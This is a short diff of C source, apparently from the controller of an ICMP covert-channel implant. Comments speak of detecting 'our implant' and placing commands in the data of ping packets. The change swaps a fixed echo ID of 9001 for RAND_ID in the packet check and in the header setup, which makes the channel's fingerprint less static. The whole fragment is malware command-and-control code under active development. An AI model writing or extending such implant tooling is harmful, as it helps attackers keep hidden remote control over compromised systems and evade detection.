@@ -80,7 +80,7 @@ ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
 // check if we got an actual connection from our implant
 /* TODO: dynamic id */
 int check_magic_byte(struct icmphdr *icmp) {
-    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
+    if (icmp->type == 8 && icmp->un.echo.id == RAND_ID) {
         return 1;
     }
     return 0;
@@ -109,7 +109,7 @@ void prep_icmp_headers(struct icmphdr *icmp, size_t input_size) {
     icmp->checksum = 0;
     icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + input_size);
     icmp->type = 8;
-    icmp->un.echo.id = 9001;
+    icmp->un.echo.id = RAND_ID;
 }
 
 // append the command to the data section of the packet
